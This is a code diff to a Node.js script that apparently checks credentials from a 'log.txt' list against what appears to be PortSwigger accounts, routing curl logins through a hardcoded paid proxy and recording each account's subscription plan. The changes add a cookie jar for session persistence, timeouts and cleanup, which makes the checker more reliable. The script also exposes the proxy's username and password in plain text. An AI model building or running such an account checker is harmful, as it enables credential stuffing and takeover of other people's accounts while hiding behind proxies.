@@ -10,6 +10,7 @@ const fs = require('fs');
 const path = require('path');
 
 const PROXY = 'http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029';
+const COOKIE_JAR = path.join(require('os').tmpdir(), `portswigger_cookies_${Date.now()}.txt`);
 
 // Parse first account from log.txt
 const logFile = fs.readFileSync('log.txt', 'utf-8');
@@ -17,17 +18,19 @@ const [username, password] = logFile.split('\n')[0].trim().split(':').map(x => x
 
 console.log(`[*] Testing account: ${username}\n`);
 
-// Curl helper - Windows compatible
+// Curl helper - Windows compatible with cookie jar for session persistence
 function curl(url, post = null) {
     try {
         let cmd;
+        const cookieFlags = `-b "${COOKIE_JAR}" -c "${COOKIE_JAR}"`;
+
         if (post) {
             // For POST requests, write data to temp file to avoid escaping issues
-            const tempFile = path.join(require('os').tmpdir(), `curl_data_${Date.now()}.txt`);
+            const tempFile = path.join(require('os').tmpdir(), `curl_data_${Date.now()}_${Math.random().toString(36).substr(2, 9)}.txt`);
             const data = Object.entries(post).map(([k,v]) => `${k}=${v}`).join('&');
             fs.writeFileSync(tempFile, data);
 
-            cmd = `curl -s -i -x "${PROXY}" -X POST -d @"${tempFile}" "${url}"`;
+            cmd = `curl -s -i ${cookieFlags} -x "${PROXY}" --connect-timeout 10 --max-time 20 -X POST -d @"${tempFile}" "${url}"`;
 
             try {
                 const output = execSync(cmd, { encoding: 'utf-8', shell: true, maxBuffer: 50*1024*1024, timeout: 35000 });
@@ -39,7 +42,7 @@ function curl(url, post = null) {
             }
         } else {
             // GET request
-            cmd = `curl -s -i -x "${PROXY}" --connect-timeout 10 --max-time 20 "${url}"`;
+            cmd = `curl -s -i ${cookieFlags} -x "${PROXY}" --connect-timeout 10 --max-time 20 "${url}"`;
             const output = execSync(cmd, { encoding: 'utf-8', shell: true, maxBuffer: 50*1024*1024, timeout: 35000 });
             return parseResponse(output);
         }
@@ -184,6 +187,10 @@ const result = {
 
 fs.writeFileSync('test_result.json', JSON.stringify(result, null, 2));
 console.log('\n[✓] Saved: test_result.json');
+
+// Clean up cookie jar
+try { fs.unlinkSync(COOKIE_JAR); } catch {}
+
 console.log('\n[✓] Test completed successfully!\n');
 
 if (plan === 'Unknown' || plan === 'Unknown (subscription active)') {
